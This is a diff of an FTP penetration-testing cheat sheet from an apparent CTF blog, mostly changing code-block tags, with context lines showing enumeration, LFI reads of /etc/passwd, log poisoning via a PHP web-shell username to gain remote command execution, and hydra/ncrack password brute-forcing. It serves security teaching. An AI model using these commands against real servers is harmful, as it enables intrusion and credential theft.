@@ -8,7 +8,7 @@ layout: post
 
 **File Transfer Protocol (FTP)** is a standard network protocol used to transfer files from one host to another over a TCP-based network, such as the internet.  
 **Default Port: `21`**  
-```ruby
+```bash
 PORT   STATE SERVICE
 21/tcp open  ftp
 ```
@@ -34,7 +34,7 @@ nmap -p21 --script="ftp-*" 192.168.1.2
 
 ##### [Shodan](https://shodan.io)
 
-```ruby
+```bash
 port:21
 port:21 vsftpd
 port:21 proftpd 1.3.5
@@ -49,7 +49,7 @@ port:21 hostname:"ftp.domain.tld"
 
 ### Usage & Commands
 
-```ruby
+```bash
 # upload file
 put cmd.php
 # upload all files
@@ -101,25 +101,25 @@ If it detects a **Local File Inclusion (LFI)** and manages to read the `/etc/pas
 > You should also verify that **port 21 (FTP)** is in the **open** state.
 {: .block-warning }
 
-```ruby
+```bash
 file.php?file=/etc/passwd
 ```
 
 If we can read the **FTP log file** located at `/var/log/vsftpd.log`.
 
-```ruby
+```bash
 file.php?file=/var/log/vsftpd.log
 ```
 
 An attacker can poison that log file by **injecting PHP code** into a fake login.
 
-```ruby
+```bash
 lftp -u '<?php system($_GET["cmd"]); ?>', 192.168.1.2
 ```
 
 We now have **Remote Command Execution (RCE)** on the destination server.
 
-```ruby
+```bash
 file.php?file=/var/log/vsftpd.log&cmd=id
 ```
 
@@ -131,7 +131,7 @@ file.php?file=/var/log/vsftpd.log&cmd=id
 
 If you got a `username` and need the `password` this is the way.
 
-```ruby
+```bash
 # default port (21)
 ncrack --user peter -P rockyou.txt ftp://192.168.1.2 -f
 hydra -t 64 -l peter -P rockyou.txt ftp://192.168.1.2 -f -I     # ftp
@@ -145,7 +145,7 @@ hydra -t 64 -l peter -P rockyou.txt ftp://192.168.1.2:1234 -f -I
 
 If you have a `password` and need the `username` this is the way.
 
-```ruby
+```bash
 # default port (21)
 ncrack -U users.dic --pass Passw0rd ftp://192.168.1.2 -f
 hydra -t 64 -L /opt/techyou.txt -p Passw0rd ftp://192.168.1.2 -f -I
@@ -166,7 +166,7 @@ hydra -t 64 -L users.dic -p Passw0rd ftp://192.168.1.2:1234 -f -I
 
 #### Install
 
-```ruby
+```bash
 # client
 apt install -y ftp
 apt install -y lftp
@@ -176,7 +176,7 @@ apt install -y vsftpd
 
 #### Change Port
 
-```ruby
+```bash
 # default port
 listen_port=21
 # other port
@@ -185,7 +185,7 @@ listen_port=1234
 
 #### User (Guest)
 
-```ruby
+```bash
 # enable
 anonymous_enable=YES
 # disable
@@ -194,7 +194,7 @@ anonymous_enable=NO
 
 #### Banner Grabbing (Disable)
 
-```ruby
+```bash
 # show version
 #ftpd_banner=Welcome to blah FTP service.
 21/tcp open  ftp     vsftpd 3.0.3
@@ -205,7 +205,7 @@ ftpd_banner=Welcome to blah FTP service.
 
 #### Daemon (Listener)
 
-```ruby
+```bash
 # external (0.0.0.0)
 listen_address=0.0.0.0
 listen_port=21
@@ -218,7 +218,7 @@ listen=YES
 
 #### Service
 
-```ruby
+```bash
 service vsftpd start
 service vsftpd stop
 service vsftpd restart
@@ -240,8 +240,8 @@ systemctl status vsftpd
 #### Disclaimer
 
 > ##### WARNING
-> All techniques presented in this blog are for educational and ethical purposes.  
-> The [VulNyx](https://vulnyx.com) team is not responsible for any misuse or damage caused to third party systems or infrastructure.
+> All techniques present in this blog are for educational, ethical or CTFs play solving purposes.
+> The [**VulNyx**](https://vulnyx.com) team is not responsible for any misuse or damage caused to third party systems or infrastructure under any circumstances.
 {: .block-warning }
 
 <br><br>
